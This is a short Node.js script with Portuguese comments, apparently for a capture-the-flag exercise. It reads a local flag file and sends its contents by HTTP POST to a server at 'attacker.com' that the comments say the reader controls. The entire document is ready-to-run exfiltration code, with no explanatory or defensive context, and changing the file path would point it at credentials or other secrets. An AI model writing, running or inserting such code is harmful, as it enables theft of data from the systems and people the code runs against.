const fs = require('fs');
const http = require('http');

// Caminho para o arquivo de flag
const flagFilePath = '/path/to/flag.txt';

// Envia a flag para um servidor externo controlado por você
const sendFlagToAttacker = (flag) => {
  const options = {
    hostname: 'attacker.com', // Substitua com seu domínio
    port: 80, // Porta HTTP padrão
    path: '/collect-flag', // Endpoint para coletar flag
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
  };

  const req = http.request(options, (res) => {
    res.on('data', (d) => {
      process.stdout.write(d);
    });
  });

  req.on('error', (e) => {
    console.error(`Problem with request: ${e.message}`);
  });

  // Enviar a flag
  req.write(JSON.stringify({ flag }));
  req.end();
};

// Lê o arquivo de flag e envia para o servidor atacante
fs.readFile(flagFilePath, 'utf8', (err, data) => {
  if (err) {
    console.error(`Error reading flag file: ${err.message}`);
    return;
  }
  sendFlagToAttacker(data);
});
